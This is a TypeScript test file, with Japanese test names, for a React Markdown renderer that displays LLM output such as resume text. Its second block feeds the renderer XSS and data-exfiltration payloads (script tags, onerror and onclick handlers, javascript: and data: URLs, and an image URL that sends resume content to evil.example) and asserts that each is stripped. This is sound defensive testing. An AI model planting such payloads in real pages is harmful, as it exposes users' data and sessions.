import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { MarkdownView } from './MarkdownView'

function html(markdown: string): HTMLElement {
  const { container } = render(<MarkdownView>{markdown}</MarkdownView>)
  return container
}

describe('MarkdownView: 描画できるもの（受け入れ基準 7）', () => {
  it('太字・斜体・箇条書き・見出しを描画する', () => {
    const view = html('# 見出し\n\n**太字**と*斜体*\n\n- 項目 1\n- 項目 2')

    expect(view.querySelector('h1')?.textContent).toBe('見出し')
    expect(view.querySelector('strong')?.textContent).toBe('太字')
    expect(view.querySelector('em')?.textContent).toBe('斜体')
    expect([...view.querySelectorAll('li')].map((li) => li.textContent)).toEqual([
      '項目 1',
      '項目 2',
    ])
  })

  it('<u> タグで、下線を描画する（標準の Markdown にはない）', () => {
    const view = html('特に<u>下線の語句</u>を強調する')

    expect(view.querySelector('u')?.textContent).toBe('下線の語句')
  })

  it('太字の中の下線も描画する', () => {
    const view = html('**重要: <u>必須条件</u>が未達**')

    expect(view.querySelector('strong u')?.textContent).toBe('必須条件')
  })

  it('表（GFM）を描画する', () => {
    const view = html('| 条件 | 結果 |\n|---|---|\n| 施工管理技士 | 達成 |')

    expect(view.querySelector('table')).not.toBeNull()
    expect(view.querySelector('td')?.textContent).toBe('施工管理技士')
  })

  it('リンクは、新しいタブで、元の画面への参照を渡さずに開く', () => {
    const link = html('[公式](https://example.com/page)').querySelector('a')

    expect(link?.getAttribute('href')).toBe('https://example.com/page')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('日本語の文章を、そのまま描画する', () => {
    expect(html('1級建築施工管理技士（2018年取得）').textContent).toContain(
      '1級建築施工管理技士（2018年取得）',
    )
  })
})

describe('MarkdownView: XSS・情報の持ち出し（LLM の出力に含まれても、描画しない）', () => {
  it('<script> を、取り除く', () => {
    const view = html('本文<script>window.__pwned = 1</script>')

    expect(view.querySelector('script')).toBeNull()
    expect(view.innerHTML).not.toContain('<script')
  })

  it('onerror などのイベント属性を、取り除く', () => {
    const view = html('<b onclick="alert(1)" onmouseover="alert(2)">押す</b>')

    const bold = view.querySelector('b')
    expect(bold?.textContent).toBe('押す')
    expect(bold?.getAttributeNames()).toEqual([])
  })

  it('javascript: の URL のリンクは、href を取り除く', () => {
    const view = html(
      '[クリック](javascript:alert(1))\n\n<a href="javascript:alert(2)">生の HTML</a>',
    )

    for (const link of view.querySelectorAll('a')) {
      expect(link.getAttribute('href') ?? '').not.toMatch(/javascript:/i)
    }
  })

  it('data: の URL のリンクも、href を取り除く', () => {
    const view = html('<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>')

    expect(view.querySelector('a')?.getAttribute('href')).toBeNull()
  })

  it('画像を描画しない（外部への読み込みで、職歴書の内容が送られるのを防ぐ）', () => {
    const view = html(
      '![x](https://evil.example/?q=職歴書の内容)\n\n<img src="https://evil.example/x.png" onerror="alert(1)">',
    )

    expect(view.querySelector('img')).toBeNull()
    expect(view.innerHTML).not.toContain('evil.example')
  })

  it('<picture>・<source>・<input> を描画しない', () => {
    const view = html(
      '<picture><source srcset="https://evil.example/a.png"></picture><input type="text" value="x">',
    )

    expect(view.querySelector('picture, source, input')).toBeNull()
    expect(view.innerHTML).not.toContain('evil.example')
  })

  it.each(['iframe', 'object', 'embed', 'style', 'form', 'svg', 'math', 'link', 'meta', 'base'])(
    '<%s> を、取り除く',
    (tag) => {
      const view = html(
        `<${tag} src="https://evil.example/" href="https://evil.example/">中身</${tag}>`,
      )

      expect(view.querySelector(tag)).toBeNull()
    },
  )

  it('style 属性を、取り除く（画面の見た目を、LLM の出力で変えられない）', () => {
    const view = html('<p style="position:fixed;top:0;left:0;width:100%;height:100%">全面</p>')

    expect(view.querySelector('p')?.getAttribute('style')).toBeNull()
  })

  it('id 属性に、接頭辞を付ける（画面の要素と、id が衝突しない）', () => {
    const view = html('<h2 id="root">見出し</h2>')

    expect(view.querySelector('h2')?.getAttribute('id')).toBe('user-content-root')
  })

  it('壊れた HTML でも、例外を出さず、本文を残す', () => {
    const view = html('<u>閉じていない下線 <b>太字 <i>斜体')

    expect(view.textContent).toContain('閉じていない下線')
  })

  it('空の文字列を描画できる', () => {
    expect(html('').textContent).toBe('')
  })
})
